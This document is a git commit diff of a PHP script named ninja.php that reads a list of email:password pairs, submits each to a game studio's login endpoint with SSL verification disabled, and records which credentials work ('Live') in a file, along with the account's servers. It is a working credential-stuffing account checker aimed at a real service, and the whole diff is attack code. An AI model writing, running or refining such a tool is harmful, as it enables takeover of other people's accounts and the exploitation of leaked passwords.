6ccb089c62ff84700b7638e9f7eda54fef647ac4
Rico <82688971+ricotriwahyu@users.noreply.github.com>
2023-07-30 06:05:42 +0700

    Update ninja.php

--- ninja.php
+++ ninja.php
@@ -15,61 +15,44 @@ $empas = preg_split(
     '/\n|\r\n?/',
     trim(file_get_contents($list))
 );
-
+$numbers = 1;
 for ($i = 0; $i < count($empas); $i++) {
     $parse = explode(":", $empas[$i]);
     $email = $parse[0];
     $pass = $parse[1];
-    # code...
     $url = "http://central.kageherostudio.com/game/lyto/login?accId=" . $email . "&pwd=" . $pass . "&channel=99108&lv=1";
 
     $curl = curl_init($url);
     curl_setopt($curl, CURLOPT_URL, $url);
     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($curl, CURLOPT_TIMEOUT, 10);
-
     $headers = array(
         "Accept: application/json",
     );
     curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
-    //for debug only!
     curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
     curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
 
     $resp = curl_exec($curl);
-    curl_close($curl);
-    //var_dump($resp);
-
     $json_data = json_decode($resp);
+
     if ($json_data->code == '1') {
-        echo "Live ";
-        $hapus = str_replace('{"code":1,"msg":"','',$resp);
-            $hasil = str_replace('"}"}','"}',$hapus);
-            $ngentot = str_replace('\\','',$hasil);
-            $result = array_values(json_decode($ngentot, true));
-        
-            echo "-> Email : ";
-            print_r($result['0']);
-            echo " | Server : ";
-            print_r($result['2']['1']);
-            print_r($result['2']['0']);
-            print_r($result['2']['2']);
-            print_r($result['2']['3']);
-            echo " | sgin : ";
-            print_r($result['3']);
-            echo "\n";
+    $data = json_decode($resp, true);
+    $msg = json_decode($data['msg'], true);
+    
+    $accId = $msg['accId'];
+    $servers = $msg['servers'];
+    $modified_servers = array_map(function ($server) {
+        return $server + 1;
+    }, $servers);
+    $servers_str = implode(',', $modified_servers);
+    
+    $Live = "[".$numbers++."] Live - $email|$pass [Server: $servers_str ]\n";
+    echo $Live;
+    file_put_contents("Live.txt", $Live . PHP_EOL, FILE_APPEND);
+    } else{
+        echo "[".$numbers++."] Die - $email|$pass \n";
+    } 
 
-            file_put_contents("test.txt", $ngentot);
-
-    } elseif ($json_data->code == '-1') {
-        echo "Die ";
-        echo "-> $email \n";
-    } elseif ($json_data->code == '-2') {
-        echo "Invalid ";
-        echo "-> $email \n";
-    }
-
-
-    //echo "-> $email \n";
-
+    curl_close($curl);
 }
